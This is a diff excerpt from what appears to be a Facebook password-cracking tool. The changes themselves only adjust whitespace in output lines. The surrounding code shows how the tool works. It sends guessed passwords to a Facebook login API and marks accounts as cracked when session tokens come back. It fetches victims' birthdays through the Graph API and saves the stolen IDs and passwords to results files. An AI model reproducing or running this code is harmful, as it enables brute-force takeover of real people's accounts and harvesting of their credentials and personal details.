@@ -757,7 +757,7 @@ class ngewe:
 			send=ses.get(api,params=param, headers={'user-agent': user_agent})
 			if "session_key" in send.text and "EAAA" in send.text:
 				ok+=1
-				print(f"\r{H}OK					\n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
+				print(f"\r{H}OK                                \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{H} {pw}{N}                \n",end="")
 				open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [✓] ID : {user}\n [✓] PW FB : {pw}\n")
 				live.append(f" [✓] ID : {user}\n [✓] PW FB : {pw}")
 				break
@@ -768,14 +768,14 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{K}CP					\n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{K}CP                                \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n [×] PW FB : {pw}\n [×] TTL : {ttl}\n")
 					chek.append(f" [×] ID : {user}\n [×] PW FB : {pw}\n [×] TTL : {ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{K}CP					\n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				print(f"\r{K}CP                                \n{N}ID {M}:{K} {user}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {user}\n [×] PW FB : {pw}\n")
 				chek.append(f" [×] ID : {user}\n [×] PW FB : {pw}")
 				break
@@ -821,14 +821,14 @@ class ngewe:
 					ak = req.get('https://graph.facebook.com/%s?access_token=%s'%(user,__kontol__))
 					az = json.loads(ak.text)
 					ttl= az['birthday'].replace("/","-")
-					print(f"\r{K}CP					\n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
+					print(f"\r{K}CP                                \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}                \n{N}[{K}×{N}] TTL      {M}:{K} {ttl}{N}                \n",end="")
 					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n [×] PW FB : {pw}\n [×] TTL : {ttl}\n")
 					chek.append(f" [×] ID : {uid}\n [×] PW FB : {pw}\n [×] TTL : {ttl}")
 					break
 				except (KeyError, IOError):
 					ttl = ' '
 				except: pass
-				print(f"\r{K}CP					\n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
+				print(f"\r{K}CP                                \n{N}ID {M}:{K} {uid}                \n{N}PW FB {M}:{K} {pw}{N}                \n",end="")
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] ID : {uid}\n [×] PW FB : {pw}\n")
 				chek.append(f" [×] ID : {uid}\n [×] PW FB : {pw}")
 				break
